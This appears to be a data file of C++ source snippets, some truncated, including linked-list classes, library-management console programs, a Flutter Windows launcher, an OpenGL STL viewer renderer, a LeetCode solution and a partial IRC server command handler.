::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\n#include <vector>\n#include <string>\n\nusing namespace std; // namespace std \uc0ac\uc6a9\n\n#include \"Book.h\"\n#include \"BookManager.h\"\n#include \"BookData.h\"\n\nvoid DisplayAllBooks(const std::vector<Book>& books);\nvoid DisplayAllStocks(const std::vector<BookData>* borrows);\n\nint main() {\n    BookManager manager;\n\n    // \ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\uc758 \uae30\ubcf8 \uba54\ub274\ub97c \ubc18\ubcf5\uc801\uc73c\ub85c \ucd9c\ub825\ud558\uc5ec \uc0ac\uc6a9\uc790 \uc785\ub825\uc744 \ucc98\ub9ac\ud569\ub2c8\ub2e4.\n    // \ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc\ub97c \uc120\ud0dd\ud558\uae30 \uc804\uae4c\uc9c0 \uacc4\uc18d \ub3d9\uc791\ud569\ub2c8\ub2e4.\n    while (true) {\n        cout << \"\\n\ub3c4\uc11c\uad00 \uad00\ub9ac \ud504\ub85c\uadf8\ub7a8\" << endl;\n        cout << \"1. \ucc45 \ucd94\uac00\" << endl; // \ucc45 \uc815\ubcf4\ub97c \uc785\ub825\ubc1b\uc544 \ucc45 \ubaa9\ub85d\uc5d0 \ucd94\uac00\n        cout << \"2. \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\" << endl; // \ud604\uc7ac \ucc45 \ubaa9\ub85d\uc5d0 \uc788\ub294 \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\n        cout << \"3. \ub3c4\uc11c \uc774\ub984\uc73c\ub85c \uac80\uc0c9\" << endl; // \ub3c4\uc11c \uc774\ub984\uc73c\ub85c \uac80\uc0c9\n        cout << \"4. \uc800\uc790 \uc774\ub984\uc73c\ub85c \uac80\uc0c9\" << endl; // \uc800\uc790 \uc774\ub984\uc73c\ub85c \uac80\uc0c9\n        cout << \"5. \ub3c4\uc11c \ub300\uc5ec\" << endl; // \ucc45 \uc81c\ubaa9\uc73c\ub85c \ub3c4\uc11c \ub300\uc5ec\n        cout << \"6. \ub3c4\uc11c \ubc18\ub0a9\" << endl; // \ucc45 \uc81c\ubaa9\uc73c\ub85c \ub3c4\uc11c \ubc18\ub0a9\n        cout << \"7. \ub3c4\uc11c \ub300\uc5ec \ud604\ud669 \ucd9c\ub825\" << endl; // \ud604\uc7ac \ub3c4\uc11c \ub300\uc5ec \ud604\ud669 \ucd9c\ub825\n        cout << \"8. \uc885\ub8cc\" << endl;\n        cout << \"\uc120\ud0dd: \";\n\n        int choice; // \uc0ac\uc6a9\uc790\uc758 \uba54\ub274 \uc120\ud0dd\uc744 \uc800\uc7a5\n        cin >> choice;\n\n        if (choice == 1) {\n            // 1\ubc88 \uc120\ud0dd: \ucc45 \ucd94\uac00\n            // \uc0ac\uc6a9\uc790\ub85c\ubd80\ud130 \ucc45 \uc81c\ubaa9\uacfc \uc800\uc790\uba85\uc744 \uc785\ub825\ubc1b\uc544 BookManager\uc5d0 \ucd94\uac00\ud569\ub2c8\ub2e4.\n            string title, author;\n            cout << \"\ucc45 \uc81c\ubaa9: \";\n            cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\n            getline(cin, title); // \uc81c\ubaa9 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            cout << \"\ucc45 \uc800\uc790: \";\n            getline(cin, author); // \uc800\uc790\uba85 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            manager.AddBook(title, author); // \uc785\ub825\ubc1b\uc740 \ucc45 \uc815\ubcf4\ub97c \ucd94\uac00\n            cout << \"\ucc45\uc774 \ucd94\uac00\ub418\uc5c8\uc2b5\ub2c8\ub2e4: \" << title << \" by \" << author << endl;\n        }\n        else if (choice == 2) {\n            // 2\ubc88 \uc120\ud0dd: \ubaa8\ub4e0 \ucc45 \ucd9c\ub825\n            // \ud604\uc7ac BookManager\uc5d0 \uc800\uc7a5\ub41c \ucc45 \ubaa9\ub85d\uc744 \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            DisplayAllBooks(manager.GetAllBooks());\n        }\n        else if (choice == 3) {\n            // 3\ubc88 : \ub3c4\uc11c \uc774\ub984\uc73c\ub85c \uac80\uc0c9\n            string title;\n            cout << \"\ucc45 \uc81c\ubaa9: \";\n            cin.ignore();\n            getline(cin, title);\n            DisplayAllBooks(manager.SearchByTitle(title));\n        }\n        else if (choice == 4) {\n            // 4\ubc88 : \uc800\uc790 \uc774\ub984\uc73c\ub85c \uac80\uc0c9\n            string author;\n            cout << \"\ucc45 \uc800\uc790: \";\n            cin.ignore();\n            getline(cin, author);\n            DisplayAllBooks(manager.SearchByAuthor(author));\n        }\n        else if (choice == 5) {\n            // 5\ubc88 : \ub3c4\uc11c \ub300\uc5ec\n            string title, author;\n            cout << \"\ucc45 \uc81c\ubaa9: \";\n            cin.ignore(); // \uc774\uc804 \uc785\ub825\uc758 \uc794\uc5ec \ubc84\ud37c\ub97c \uc81c\uac70\n            getline(cin, title); // \uc81c\ubaa9 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            cout << \"\ucc45 \uc800\uc790: \";\n            getline(cin, author); // \uc800\uc790\uba85 \uc785\ub825 (\uacf5\ubc31 \ud3ec\ud568)\n            if (manager.HasBook({ title, author })) {\n                bool result = manager.BorrowBook({ title, author }, 1);\n                if (result) {\n                    cout << title << \"\uc744 \uc131\uacf5\uc801\uc73c\ub85c \ub300\uc5ec\ud588\uc2b5\ub2c8\ub2e4.\" << endl;\n                }\n                else {\n                    cout << title << \"\uc744 \ub300\uc5ec\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n                }\n            }\n            else {\n                cout << \"\ud574\ub2f9 \ucc45\uc774 \uc874\uc7ac\ud558\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4.\" << endl;\n            }\n        }\n        else if (choice == 6) {\n            // 6\ubc88 : \ub3c4\uc11c \ubc18\ub0a9\n            string title, author;\n            cout << \"\ucc45 \uc81c\ubaa9 : \";\n            cin.ignore();\n            getline(cin, title);\n            cout << \"\ucc45 \uc800\uc790 : \";\n            getline(cin, author);\n            if (manager.HasBook({ title, author })) {\n                bool result = manager.ReturnBook({ title, author }, 1);\n                if (result) {\n                    cout << title << \"\uc744 \uc131\uacf5\uc801\uc73c\ub85c \ubc18\ub0a9\ud588\uc2b5\ub2c8\ub2e4.\" << endl;\n                }\n                else {\n                    cout << title << \" \ubc18\ub0a9\uc744 \uc2e4\ud328\ud588\uc2b5\ub2c8\ub2e4. \uc774\ubbf8 \ubaa8\ub4e0 \ucc45\uc774 \ubc18\ub0a9\ub418\uc5b4 \uc788\uc2b5\ub2c8\ub2e4.\" << endl;\n                }\n            }\n            else {\n                cout << \"\ud574\ub2f9 \ucc45\uc740 \uc874\uc7ac\ud558\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4.\" << endl;\n            }\n        }\n        else if (choice == 7) {\n            // 7\ubc88 : \ub3c4\uc11c \ub300\uc5ec \ud604\ud669 \ucd9c\ub825\n            DisplayAllStocks(manager.GetAllBookData());\n        }\n        else if (choice == 8) {\n            // 8\ubc88 \uc120\ud0dd: \uc885\ub8cc\n            // \ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud558\uace0 \uc0ac\uc6a9\uc790\uc5d0\uac8c \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            cout << \"\ud504\ub85c\uadf8\ub7a8\uc744 \uc885\ub8cc\ud569\ub2c8\ub2e4.\" << endl;\n            break; // while \ub8e8\ud504 \uc885\ub8cc\n        }\n        else {\n            // \uc798\ubabb\ub41c \uc785\ub825 \ucc98\ub9ac\n            // \uba54\ub274\uc5d0 \uc5c6\ub294 \ubc88\ud638\ub97c \uc785\ub825\ud588\uc744 \uacbd\uc6b0 \uacbd\uace0 \uba54\uc2dc\uc9c0\ub97c \ucd9c\ub825\ud569\ub2c8\ub2e4.\n            cout << \"\uc798\ubabb\ub41c \uc785\ub825\uc785\ub2c8\ub2e4. \ub2e4\uc2dc \uc2dc\ub3c4\ud558\uc138\uc694.\" << endl;\n        }\n    }\n\n    return 0; // \ud504\ub85c\uadf8\ub7a8 \uc815\uc0c1 \uc885\ub8cc\n}\n\nvoid DisplayAllBooks(const std::vector<Book>& books)\n{\n    if (books.empty()) {\n        cout << \"\ud604\uc7ac \ub4f1\ub85d\ub41c \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n        return;\n    }\n\n    cout << \"\ub3c4\uc11c \ubaa9\ub85d:\" << endl;\n    for (auto book : books) {\n        cout << \"- \" << book.title << \" by \" << book.author << endl;\n    }\n}\n\nvoid DisplayAllStocks(const std::vector<BookData>* borrows)\n{\n    if (borrows->empty()) {\n        cout << \"\ud604\uc7ac \ub4f1\ub85d\ub41c \ucc45\uc774 \uc5c6\uc2b5\ub2c8\ub2e4.\" << endl;\n    }\n\n    cout << \"\ub300\uc5ec \ud604\ud669:\" << endl;\n    for (int i = 0; i < borrows->size(); i++) {\n        const BookData& data = (*borrows)[i];\n        Book book = data.GetBook();\n        cout << \"- \" << book.title << \" by \" << book.author << \" - \" << data.AvailableCount() << \"/\" << data.TotalCount() << endl;\n    }\n}",
    "#include <iostream>\nusing namespace std;\nclass Node\n{\npublic:\n    int data;\n    Node *prev;\n    Node *next;\n    Node(int data, Node *prev, Node *next)\n    {\n        this->data = data;\n        this->prev = prev;\n        this->next = next;\n    }\n};\nclass Double_linked_list\n{\nprivate:\n    Node *head;\n    Node *tail;\n    int size;\n\npublic:\n    Double_linked_list()\n    {\n        head = nullptr;\n        tail = nullptr;\n        size = 0;\n    }\n    void add_first_item(int item)\n    {\n        if (size == 0)\n        {\n            Node *newNode = new Node(item, nullptr, nullptr);\n            head = newNode;\n            tail = newNode;\n            size++;\n            // delete newNode;\n        }\n        else\n        {\n            Node *newNode = new Node(item, nullptr, head);\n            head->prev = newNode;\n            head = newNode;\n            size++;\n            // delete newNode;\n        }\n    }\n    void add_last_item(int item)\n    {\n        if (size == 0)\n        {\n            Node *newNode = new Node(item, nullptr, nullptr);\n            head = newNode;\n            tail = newNode;\n            size++;\n            // delete newNode;\n        }\n        else\n        {\n            Node *newNode = new Node(item, tail, nullptr);\n            tail->next = newNode;\n            tail = newNode;\n            size++;\n            // delete newNode;\n        }\n    }\n    void add_item(int item)\n    {\n        add_last_item(item);\n    }\n    void add_item(int item, int pos)\n    {\n        if (pos >= 0 && pos < size)\n        {\n\n            if (pos < int(size / 2))\n            {\n                Node *iterate = head;\n                for (int i = 0; i < int(size / 2); i++)\n                {\n                    if (pos == i)\n                    {\n                        Node *newNode = new Node(item, iterate->prev, iterate);\n                        iterate->prev->next = newNode;\n                        iterate->prev = newNode;\n                        iterate = newNode;\n                        size++;\n                    }\n                    iterate = iterate->next;\n                }\n            }\n            else\n            {\n                Node *iterate = tail;\n                for (int i = size - 1; i >= int(size / 2); i--)\n                {\n                    if (pos == i)\n                    {\n                        Node *newNode = new Node(item, iterate, iterate->next);\n                        iterate->next->prev = newNode;\n                        iterate->next = newNode;\n                        iterate = newNode;\n                        size++;\n                    }\n                    iterate = iterate->prev;\n                }\n            }\n        }\n    }\n    int len()\n    {\n        return size;\n    }\n    int get(int pos)\n    {\n        if (pos >= 0)\n        {\n            Node *iterate = head;\n            for (int i = 0; i < size; i++)\n            {\n                if (i == pos)\n                {\n                    return iterate->data;\n                }\n                iterate = iterate->next;\n            }\n            return -1;\n        }\n        return -1;\n    }\n\n    int Get_index(int item)\n    {\n\n        Node *iterate = head;\n        for (int i = 0; i < size; i++)\n        {\n            if (iterate->data == item)\n            {\n                return i;\n            }\n            iterate = iterate->next;\n        }\n        return -1;\n    }\n    int remove_item(int item)\n    {\n\n        Node *iterate = head;\n        for (int i = 0; i < size; i++)\n        {\n            if (iterate->data == item)\n            {\n                if (iterate->prev != nullptr && iterate->next != nullptr)\n                {\n                    iterate->prev->next = iterate->next;\n                    iterate->next->prev = iterate->prev;\n                    delete iterate;\n                    size--;\n                    return 0;\n                }\n                else if (iterate == head)\n                {\n                    iterate->next->prev = nullptr;\n                    head = iterate->next;\n                    delete iterate;\n                    size--;\n                    return 0;\n                }\n                else if (iterate == tail)\n                {\n                    iterate->prev->next = nullptr;\n                    tail = iterate->prev;\n                    delete iterate;\n                    size--;\n                    return 0;\n                }\n            }\n            iterate = iterate->next;\n        }\n        cout << \"item not found\" << endl;\n        return -1;\n    }\n\n    void remove_at_pos(int pos)\n    {\n        if (pos >= 0 && pos < size)\n        {\n\n            if (pos <= int(size / 2))\n            {\n                Node *iterate = head;\n                for (int i = 0; i < int(size / 2); i++)\n                {\n                    if (pos == i)\n                    {\n                        if (iterate->prev != nullptr && iterate->next != nullptr)\n                        {\n                            iterate->prev->next = iterate->n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tracker_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\r\n * @file CRenderer.cpp\r\n * @author Grzegorz Pietrusiak <gpsspam2@gmail.com>\r\n * @date 2024-12-31\r\n * @copyright MIT License\r\n */\r\n\r\n#include \"CRenderer.h\"\r\n#include <GL/freeglut.h>\r\n#include \"CLogger.h\"\r\n#include \"CTextOutput.h\"\r\n#include <iomanip>\r\n\r\nusing namespace std::literals::string_literals;\r\n\r\nErr CRenderer::init(WNDPROC pMsgHandler)\r\n{\r\n    Err retVal{createWindow(pMsgHandler)};\r\n    if (Err::NoError == retVal)\r\n    {\r\n        retVal = createRenderContext();\r\n        if (Err::NoError == retVal)\r\n        {\r\n            int argc{0};\r\n            char dummyArg[]{\"\"};\r\n            char *argv[]{dummyArg};\r\n            glutInit(&argc, argv);\r\n            GLenum glErr{glGetError()};\r\n            if (GL_NO_ERROR != glErr)\r\n            {\r\n                logPrint(Error) << \"OpenGL error:\" << glErr;\r\n                retVal = Err::GlInitError;\r\n            }\r\n            else\r\n            {\r\n                convertCoordinateSystem();\r\n                logPrint(Info) << \"OpenGL version: \" << glGetString(GL_VERSION);\r\n            }\r\n        }\r\n    }\r\n\r\n    return retVal;\r\n}\r\n\r\nvoid CRenderer::destroy()\r\n{\r\n    logPrint(Trace) << \"CRenderer destroy\";\r\n    if (m_hRenderContext)\r\n    {\r\n        wglDeleteContext(m_hRenderContext);\r\n    }\r\n}\r\n\r\nErr CRenderer::createWindow(WNDPROC pMsgHandler)\r\n{\r\n    Err retVal{Err::NoError};\r\n\r\n\tconstexpr int iInitialWindowWidth{800};\r\n\tconstexpr int iInitialWindowHeight{600};\r\n\tconstexpr const CHAR *szClassName{\"GP\"};\r\n\tconstexpr const CHAR *szTitle{\"STL viewer \" APP_VERSION \" \\xA9 2025 Grzegorz Pietrusiak\"};\r\n\tconstexpr DWORD dwWindowStyle{WS_VISIBLE | WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN | WS_CLIPSIBLINGS};\r\n\r\n    logPrint(Trace) << \"createWindow\";\r\n    HINSTANCE hInstance{GetModuleHandle(nullptr)}; // currently running EXE instance\r\n\tif (hInstance)\r\n\t{\r\n        WNDCLASS  wndClass{}; // init the structure with zeros first\r\n        wndClass.style         = CS_HREDRAW | CS_VREDRAW | CS_OWNDC;\r\n        wndClass.lpfnWndProc   = pMsgHandler;\r\n        wndClass.hInstance     = hInstance;\r\n        wndClass.lpszClassName = szClassName;\r\n        wndClass.hCursor       = LoadCursor(nullptr, IDC_ARROW);\r\n        if (RegisterClass(&wndClass))\r\n        {\r\n            const int iScreenWidth{GetSystemMetrics(SM_CXSCREEN)};\r\n            const int iScreenHeight{GetSystemMetrics(SM_CYSCREEN)};\r\n            const int iInitialWindowPosX{(iScreenWidth - iInitialWindowWidth) / 2};\r\n            const int iInitialWindowPosY{(iScreenHeight - iInitialWindowHeight) / 2};\r\n            m_hWindowHandle = CreateWindow(szClassName, szTitle, dwWindowStyle, iInitialWindowPosX, iInitialWindowPosY, iInitialWindowWidth, iInitialWindowHeight, nullptr, nullptr, hInstance, nullptr);\r\n            if (!m_hWindowHandle)\r\n            {\r\n                logPrint(Error) << \"Couldn't create the window\";\r\n                retVal = Err::CantCreateWindow;\r\n            }\r\n        }\r\n        else\r\n        {\r\n            logPrint(Error) << \"Couldn't register the window class\";\r\n            retVal = Err::CantRefgisterWindowClass;\r\n        }\r\n\t}\r\n\telse\r\n    {\r\n        logPrint(Error) << \"Couldn't create the window\";\r\n        retVal = Err::CantGetAppInstance;\r\n    }\r\n\r\n    return retVal;\r\n}\r\n\r\nErr CRenderer::createRenderContext()\r\n{\r\n    Err retVal{Err::NoError};\r\n\r\n    logPrint(Trace) << \"createRenderContext\";\r\n\t// Get the window's device context\r\n\tm_hDeviceContext = GetDC(m_hWindowHandle);\r\n\tif (m_hDeviceContext)\r\n    {\r\n        // Choose a pixel format\r\n        PIXELFORMATDESCRIPTOR pfd{}; // init the structure with zeros first\r\n        pfd.nSize = sizeof(PIXELFORMATDESCRIPTOR);\r\n        pfd.nVersion = 1;\r\n        pfd.dwFlags = PFD_SUPPORT_OPENGL | PFD_DRAW_TO_WINDOW | PFD_DOUBLEBUFFER;\r\n        pfd.iPixelType = PFD_TYPE_RGBA;\r\n        pfd.cColorBits = 24;\r\n        pfd.cDepthBits = 24;\r\n\r\n        const int iPixelFormat{ChoosePixelFormat(m_hDeviceContext, &pfd)};\r\n        if (iPixelFormat)\r\n        {\r\n            if (SetPixelFormat(m_hDeviceContext, iPixelFormat, &pfd))\r\n            {\r\n                m_hRenderContext = wglCreateContext(m_hDeviceContext);\r\n                if (m_hRenderContext)\r\n                {\r\n                    if (!wglMakeCurrent(m_hDeviceContext, m_hRenderContext))\r\n                    {\r\n                        logPrint(Error) << \"Couldn't bind the render context\";\r\n                        retVal = Err::CantBindRenderContext;\r\n                    }\r\n                }\r\n                else\r\n                {\r\n                    logPrint(Error) << \"Couldn't create a render context\";\r\n                    retVal = Err::CantCreateRenderContext;\r\n                }\r\n            }\r\n            else\r\n            {\r\n                logPrint(Error) << \"Couldn't set the pixel format\";\r\n                retVal = Err::CantSetPixelFormat;\r\n            }\r\n        }\r\n        else\r\n        {\r\n            logPrint(Error) << \"Couldn't find a pixel format\";\r\n            retVal = Err::CantFindPixelFormat;\r\n        }\r\n    }\r\n ",
    "#include<iostream>\n#include<fstream>\nusing namespace std;\n\nclass temp{\n    \n    string id,name,author,search;\n    fstream file;\n    public :\n    void showAll();\n    void addBook();\n    void extractBook();\n\n}obj;\n\nint main(){\n    while(1){\n        cout<<\"-----MENU-----\\n\";\n        cout<<\"1)SHOW ALL BOOKS IN LIBRARY\\n2)ADD A BOOK TO THE COLLECTION\\n3)EXTRACT BOOK\\n4)EXIT\\n\";\n        int choice;\n        cout<<\"Enter choice\\n\";\n        cin>>choice;\n        switch(choice){\n            case 1:\n                cin.ignore();\n                obj.showAll();\n                break;\n            case 2:\n                cin.ignore();\n                obj.addBook();\n                break;\n            case 3:\n                cin.ignore();\n                obj.extractBook();\n                break;\n            case 4:\n                return 0;\n            default:\n                cout<<\"Invalid choice\"<<endl;\n        }\n    }\n    return 0;\n}\n\nvoid temp::showAll(){\n    file.open(\"library.txt\",ios::in);\n    while(getline(file,id,'*') && getline(file,name,'*') && getline(file,author)){\n                    cout<<\"id : \"<<id<<\"name : \"<<name<<\"author : \"<<author<<endl;\n    }\n    file.close();\n}\n\nvoid temp::addBook(){\n    cout<<\"Enter id of the book\"<<endl;\n    getline(cin,id);\n    cout<<\"Enter name of the book\"<<endl;\n    getline(cin,name);\n    cout<<\"Enter author of the book\"<<endl;\n    getline(cin,author);\n    file.open(\"library.txt\",ios::out|ios::app);\n    file<<id<<\"*\"<<name<<\"*\"<<author<<endl;\n    file.close();\n}\n\nvoid temp::extractBook(){\n    showAll();\n    cout<<\"Enter book id you wanna extract\"<<endl;\n    cin>>search;\n    file.open(\"library.txt\",ios::in);\n    bool flag=false;\n    while(getline(file,id,'*') && getline(file,name,'*') && getline(file,author)){\n        if(id==search){\n            cout<<\"id : \"<<id<<\"name : \"<<name<<\"author : 1\"<<author<<endl;\n            flag=true;\n            break;\n        }\n    }\n    if(flag==false){\n        cout<<\"Book not found\"<<endl;\n    }\n    file.close();\n}",
    "//  Functions for singly Linked List(linear & Circular)\r\n\r\n#include<iostream>\r\nusing namespace std;\r\n\r\nstruct node\r\n{\r\n    int data;\r\n    struct node *next;\r\n};\r\n\r\ntypedef struct node NODE;\r\ntypedef struct node* PNODE;\r\n\r\n// Functions for Singly Linear LinkedList:\r\nclass SinglyLL\r\n{\r\n    public:\r\n        PNODE head;\r\n        int iCount;\r\n\r\n        SinglyLL()\r\n        {\r\n            head = NULL;\r\n            iCount = 0;\r\n        }\r\n\r\n        void Display()\r\n        {\r\n            PNODE temp = head;\r\n\r\n            cout<<\"Elements of LinkedList are : \\n\";\r\n\r\n            while(temp != NULL)\r\n            {\r\n                cout<<\"| \"<<temp->data<<\" | -> \";\r\n                temp = temp -> next;\r\n            }\r\n\r\n            cout<<\"NULL\\n\";\r\n        }\r\n        \r\n        int Count()\r\n        {\r\n            return iCount;\r\n        }\r\n\r\n        void InsertFirst(int no)\r\n        {\r\n            PNODE newn = NULL;\r\n\r\n            newn = new NODE;    \r\n            newn->data = no;\r\n            newn->next = NULL;\r\n\r\n            if(head == NULL)\r\n            {\r\n                head = newn;\r\n            }\r\n            else\r\n            {\r\n                newn->next = head;\r\n                head = newn;\r\n            }\r\n            iCount++;\r\n        }\r\n\r\n        void InsertLast(int no)\r\n        {\r\n            PNODE newn = NULL;\r\n            PNODE temp = NULL;\r\n\r\n            newn = new NODE;   \r\n            newn->data = no;\r\n            newn->next = NULL;\r\n\r\n            if(head == NULL)\r\n            {\r\n                head = newn;\r\n            }\r\n            else\r\n            {\r\n                temp = head;\r\n\r\n                while(temp -> next != NULL)\r\n                {\r\n                    temp = temp -> next;\r\n                }\r\n\r\n                temp->next = newn;\r\n            }\r\n            iCount++;\r\n        }\r\n        \r\n        void InsertAtPos(int no , int ipos)\r\n        {\r\n            int i = 0;\r\n            PNODE newn = NULL;\r\n            PNODE temp = NULL;\r\n\r\n            if((ipos < 1) || (ipos > iCount+1))\r\n            {\r\n                cout<<\"Invalid position\\n\";\r\n                return;\r\n            }\r\n\r\n            if(ipos == 1)\r\n            {\r\n                InsertFirst(no);\r\n            }\r\n            else if(ipos == iCount + 1)\r\n            {\r\n                InsertLast(no);\r\n            }\r\n            else\r\n            {\r\n                newn = new NODE;\r\n                newn->data = no;\r\n                newn->next = NULL;\r\n\r\n                temp = head;\r\n\r\n                for(i =1; i< ipos -1; i++)\r\n                {\r\n                    temp = temp->next;\r\n                }\r\n\r\n                newn->next = temp->next;\r\n                temp->next = newn;\r\n\r\n                iCount++;\r\n            }\r\n        }\r\n\r\n        void DeleteFirst()\r\n        {\r\n            PNODE temp = NULL;\r\n\r\n            if(head == NULL)\r\n            {\r\n                return;\r\n            }\r\n            else if(head->next == NULL)\r\n            {\r\n                delete head;\r\n                head = NULL;\r\n            }\r\n            else\r\n            {\r\n                temp = head;\r\n\r\n                head = head -> next;\r\n                delete temp;\r\n                \r\n            }\r\n            iCount--;\r\n        }\r\n        \r\n        void DeleteLast()\r\n        {\r\n            PNODE temp = NULL;\r\n\r\n            if(head == NULL)\r\n            {\r\n                return;\r\n            }\r\n            else if(head->next == NULL)\r\n            {\r\n                delete head;\r\n                head = NULL;\r\n            }\r\n            else\r\n            {\r\n                temp = head;\r\n\r\n                while(temp->next->next != NULL)\r\n                {\r\n                    temp = temp -> next;\r\n                }\r\n\r\n                delete temp->next;\r\n                temp->next = NULL;\r\n            }\r\n            iCount--;\r\n        }\r\n        \r\n        void DeleteAtPos(int ipos)\r\n        {\r\n            int i = 0;\r\n            PNODE temp = NULL;\r\n            PNODE target = NULL;\r\n\r\n            if((ipos < 1) || (ipos > iCount))\r\n            {\r\n                cout<<\"Invalid position\\n\";\r\n                return;\r\n            }\r\n\r\n            if(ipos == 1)\r\n            {\r\n                DeleteFirst();\r\n            }\r\n            else if(ipos == iCount)\r\n            {\r\n                DeleteLast();\r\n            }\r\n            else\r\n            {\r\n                temp = head;\r\n\r\n                for(i =1; i< ipos -1; i++)\r\n                {\r\n                    temp = temp->next;\r\n                }\r\n\r\n                target = temp->next;\r\n\r\n                temp -> next = target->next;\r\n                delete target;\r\n\r\n                iCount--;\r\n            }\r\n        }        \r\n};\r\n\r\n// Functions for Singly circular LinkedList:\r\nclass SinglyCL\r\n{\r\n    public:\r\n        PNODE head;\r\n        PNODE tail;\r\n        int iCount;\r\n\r\n        SinglyCL()\r\n        {\r\n            head = NULL;\r\n            tail = NULL;\r\n            iCount = 0;\r\n        }\r\n\r\n        v",
    "class Solution {\npublic:\n    vector<vector<int>> dirs = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}};\n\n    int minCost(vector<vector<int>>& grid) {\n        int numRows = grid.size(), numCols = grid[0].size();\n\n        vector<vector<int>> minCost(numRows, vector<int>(numCols, INT_MAX));\n        deque<pair<int, int>> deque;\n        deque.push_front({0, 0});\n        minCost[0][0] = 0;\n\n        while (!deque.empty()) {\n            auto [row, col] = deque.front();\n            deque.pop_front();\n            for (int dir = 0; dir < 4; dir++) {\n                int newRow = row + dirs[dir][0];\n                int newCol = col + dirs[dir][1];\n                int cost = (grid[row][col] != (dir + 1)) ? 1 : 0;\n                if (isValid(newRow, newCol, numRows, numCols) &&\n                    minCost[row][col] + cost < minCost[newRow][newCol]) {\n                    minCost[newRow][newCol] = minCost[row][col] + cost;\n                    if (cost == 1) {\n                        deque.push_back({newRow, newCol});\n                    } else {\n                        deque.push_front({newRow, newCol});\n                    }\n                }\n            }\n        }\n\n        return minCost[numRows - 1][numCols - 1];\n    }\n\nprivate:\n    bool isValid(int row, int col, int numRows, int numCols) {\n        return row >= 0 && row < numRows && col >= 0 && col < numCols;\n    }\n};",
    "#include \"Server.hpp\"\n\n/*\n###############################################################################\n#\t\t\t\t\t\t\t\t\tPART\t\t\t\t\t\t\t\t\t  #\n###############################################################################\n*/\n\nvoid\tServer::PartCommand(std::vector<std::string> &splited_cmd, int &fd)\n{\n\t(void)splited_cmd;\n\t(void)fd;\n\tstd::vector<std::string>\ttmp;\n\tstd::vector<std::string>\treason;\n\tstd::stringstream\t\t\tss;\n\tbool\t\t\t\t\t\tflag;\n\tsize_t\t\t\t\t\t\ti;\n\tsize_t\t\t\t\t\t\tj;\n\n\t/*if (!SplitCmdPart(cmd, tmp, reason, fd))\n\t{\n\t\tsenderror(461, GetClient(fd)->GetNickName(), GetClient(fd)->GetFd(), \" :Not enough  parameters\\r\\n\");\n\t\treturn ;\n\t}*/\n\tfor (i = 0, i < tmp.size(); i++)\n\t{\n\t\tflag = false;\n\t\tfor (j = 0; i < tmp.size(); j++)\n\t\t{\n\t\t\tif (this->channels[j].GetName() == tmp[i])\n\t\t\t{\n\t\t\t\tflag = true;\n\t\t\t\tif (!channels[j].get_client(fd) && !channels[j].get_admin(fd))\n\t\t\t\t{\n\t\t\t\t\tsenderror(442, GetClient(fd)->GetNickName(), \"#\" + tmp[i], GetClient(fd)->GetFd(), \" :You are not on that channel\\r\\n\");\n\t\t\t\t\tcontinue ;\n\t\t\t\t}\n\t\t\t\tss << \":\" << GetClient(fd)->GetNickName() << \"!~\" << GetClient(fd)->GetUserName() << \"@\" << \"localhost\" << \" PART #\" << tmp[i];\n\t\t\t\tif (!reason.empty())\n\t\t\t\t\tss << \" :\" << reason << \"\\r\\n\";\n\t\t\t\telse\n\t\t\t\t\tss << \"\\r\\n\";\n\t\t\t\tchannels[j].sendTo_all(ss.str());\n\t\t\t\tif (channels[j].get_admin(channels[j].GetClientInChannel(GetClient(fd)->GetNickName())->GetFd()))\n\t\t\t\t\tchannels[j].remove_admin(channels[j].GetClientInChannel(GetClient(fd)->GetNickName())->GetFd());\n\t\t\t\telse\n\t\t\t\t\tchannels[j].remove_client(channels[j].GetClientInChannel(GetClient(fd)->GetNickName())->GetFd());\n\t\t\t\tif (channels[j].GetClientsNumber() == 0)\n\t\t\t\t\tchannels.erase(channels.begin() + j);\n\t\t\t}\n\t\t}\n\t\tif (!flag) // if the channel doesn't exist\n\t\t\tsenderror(403, GetClient(fd)->GetNickName(), \"#\" + tmp[i], 